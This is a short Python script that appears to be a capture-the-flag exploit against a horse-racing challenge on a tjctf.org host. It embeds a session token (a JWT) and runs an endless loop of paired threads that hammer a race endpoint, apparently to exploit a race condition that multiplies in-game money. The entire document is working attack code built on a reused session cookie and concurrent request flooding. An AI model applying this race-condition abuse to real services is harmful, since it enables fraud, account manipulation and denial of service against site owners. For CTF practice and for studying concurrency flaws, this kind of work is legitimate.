import threading
import requests

token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjp0cnVlLCJpc19vbWthciI6ZmFsc2UsIm1vbmV5IjowLCJob3JzZXMiOlsiTWljaGFlbCJdfQ.miceEpW2tecb7fEObqSF8FFD0feclOAj01d2jjAV42oMtdARuDMOfJ7hGAbT4nu8G26pOIPS3VUY7V9AWdbb9LKbg48IgPUP8ZumrbKC8WVt3ctTAvsmGBdcVWGErmNHlKPcUgS_K6I5M-cnaoqjV0hYfMCuc1oA_27Rf1n5oM_pgw4dwUX-plQXdgSFXTcp5F6lv2IlTRwJxlV4QP4JnDXst36YzVblq0BpGOCQAcqij7lpk5ZNJlQsZTXHSbx0mus5_MiYcWFNQ4PEepaP6p710eCtbZnbymDnnTPXyy--PSYDBAMeWE4jNKq3X75w_oLzibFXsiWkz5GN1zRsAdpcryBRb368SObp0hnVFka0RcPmBoP44sS-N1-LtyFLy4D-yo6IUev6ZTap0P8DvZbfCUtnZkFaOtTW5gG5GZIub_VhJxFRaGGnl2Zh3tZhW4EmKBgzUt1qCutHL6s-sIas1kVDyuCfejBhIiJ5rWhGwrygdawf9ErbLhoG6gGdWN-9NN6up21rDTSzEaflDNDaJmDm3p1eigkGyxNLtPV_7OdRTn7q59lSNVqGgftmZMBPmhE4lMOzs1OrgUjJDV7_k2zKPRFuB-3wklfDVlvxkkcHuztIqwhkJiO24qX1GA6XE3fKxO3epI0VEMQAZbmczyk7hO3wc6vLMrD8hZg"
race_url = "https://moar_horse.tjctf.org/do_race"
cookies = {"token" : token}
params = {"horse" : "Michael"}

def do_race():
    r = requests.get(race_url, cookies = cookies, params = params)
    print r.text + "\n";
    return 1

while True:
    t1 = threading.Thread(target = do_race)
    t2 = threading.Thread(target = do_race)
    t1.start()
    t2.start()
    t1.join()
    t2.join()